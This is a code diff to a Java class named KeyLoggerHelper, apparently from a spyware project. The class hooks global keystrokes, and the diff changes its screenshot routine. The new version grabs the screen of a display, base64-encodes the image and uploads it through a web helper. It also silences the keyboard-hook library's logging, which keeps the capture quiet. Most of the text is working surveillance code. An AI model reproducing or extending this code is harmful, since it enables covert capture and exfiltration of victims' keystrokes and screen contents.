@@ -1,4 +1,7 @@
 import java.awt.AWTException;
+import java.awt.DisplayMode;
+import java.awt.GraphicsDevice;
+import java.awt.GraphicsEnvironment;
 //import java.awt.DisplayMode;
 //import java.awt.GraphicsDevice;
 //import java.awt.GraphicsEnvironment;
@@ -15,6 +18,8 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.util.Base64;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 import javax.imageio.ImageIO;
 //import javax.swing.JButton;
@@ -54,70 +59,44 @@ public class KeyLoggerHelper extends JFrame implements NativeKeyListener {
 		this.web = web;
 		this.screen_shot_number = 0;
 		this.current_number = 0;
+		
+		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+		logger.setLevel(Level.OFF);
 
 	}
 	
-//	public void take_pic() {
-//		// System.out.println("Take Screenshot");
-//		try {
-//			int width = 0;
-//			int height = 0;
-//			int xCor = 0;
-//			int yCor = 0;
-//
-//			GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
-//			GraphicsDevice[] gs = ge.getScreenDevices();
-//
-//			DisplayMode mode = gs[gs.length - 1].getDisplayMode();
-//			width += mode.getWidth();
-//			height += mode.getHeight();
-//			double scale = 96.0 / Toolkit.getDefaultToolkit().getScreenResolution();
-//			xCor = (int) ((gs[gs.length - 1].getDefaultConfiguration().getBounds().getX()) * scale);
-//			yCor = (int) ((gs[gs.length - 1].getDefaultConfiguration().getBounds().getY()) * scale);
-//
-//			BufferedImage image = new Robot().createScreenCapture(new Rectangle(xCor, yCor, width, height));
-////			ImageIO.write(image, "jpg",
-////					new File("screenshots/screenshot" + Integer.toString(screen_shot_number) + ".jpg"));
-//
-//			ByteArrayOutputStream baos = new ByteArrayOutputStream();
-//			ImageIO.write(image, "jpg", baos);
-//			
-//			String b64Image = Base64.getEncoder().encodeToString(baos.toByteArray());
-//
-//			System.out.println("Uploaded Screenshot"); 
-//			web.uploadScreenshot(b64Image);
-//			
-//
-//			screen_shot_number++;
-//			current_number++;
-//
-//		} catch (IOException e) {
-//			// TODO Auto-generated catch block
-//			e.printStackTrace();
-//		} catch (HeadlessException | AWTException e) {
-//
-//		}
-//	}
-
 	public void take_pic() {
 		// System.out.println("Take Screenshot");
 		try {
-			Rectangle fullscreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-			BufferedImage screenshot = new Robot().createScreenCapture(fullscreen);
-			Image resized = screenshot.getScaledInstance(720, 480, Image.SCALE_DEFAULT);
-			screenshot = Screenshot.toBufferedImage(resized);
+			int width = 0;
+			int height = 0;
+			int xCor = 0;
+			int yCor = 0;
+
+			GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
+			GraphicsDevice[] gs = ge.getScreenDevices();
+
+			DisplayMode mode = gs[gs.length - 1].getDisplayMode();
+			width += mode.getWidth();
+			height += mode.getHeight();
+			double scale = 96.0 / Toolkit.getDefaultToolkit().getScreenResolution();
+			xCor = (int) ((gs[gs.length - 1].getDefaultConfiguration().getBounds().getX()) * scale);
+			yCor = (int) ((gs[gs.length - 1].getDefaultConfiguration().getBounds().getY()) * scale);
+
+			BufferedImage image = new Robot().createScreenCapture(new Rectangle(xCor, yCor, width, height));
+//			ImageIO.write(image, "jpg",
+//					new File("screenshots/screenshot" + Integer.toString(screen_shot_number) + ".jpg"));
+
 			ByteArrayOutputStream baos = new ByteArrayOutputStream();
-			ImageIO.write(screenshot, "jpg", baos);
-
-			File file = new File("screenshot.png");
-//			file.createNewFile();
+			ImageIO.write(image, "jpg", baos);
 			
-			ImageIO.write(screenshot, "png", file);
-
 			String b64Image = Base64.getEncoder().encodeToString(baos.toByteArray());
-			
-			System.out.println("Uploaded Screenshot: " + baos.toByteArray().length); 
+
 			web.uploadScreenshot(b64Image);
+			
+
+			screen_shot_number++;
+			current_number++;
 
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
@@ -126,6 +105,34 @@ public class KeyLoggerHelper extends JFrame implements NativeKeyListener {
 
 		}
 	}
+
+//	public void take_pic() {
+//		// System.out.println("Take Screenshot");
+//		try {
+//			Rectangle fullscreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+//			BufferedImage screenshot = new Robot().createScreenCapture(fullscreen);
+//			Image resized = screenshot.getScaledInstance(720, 480, Image.SCALE_DEFAULT);
+//			screenshot = Screenshot.toBufferedImage(resized);
+//			ByteArrayOutputStream baos = new ByteArrayOutputStream();
+//			ImageIO.write(screenshot, "jpg", baos);
+//
+//			File file = new File("screenshot.png");
+////			file.createNewFile();
+//			
+//			ImageIO.write(screenshot, "png", file);
+//
+//			String b64Image = Base64.getEncoder().encodeToString(baos.toByteArray());
+//			
+//			System.out.println("Uploaded Screenshot: " + baos.toByteArray().length); 
+//			web.uploadScreenshot(b64Image);
+//
+//		} catch (IOException e) {
+//			// TODO Auto-generated catch block
+//			e.printStackTrace();
+//		} catch (HeadlessException | AWTException e) {
+//
+//		}
+//	}
 
 	
 	public void nativeKeyPressed(NativeKeyEvent e) {
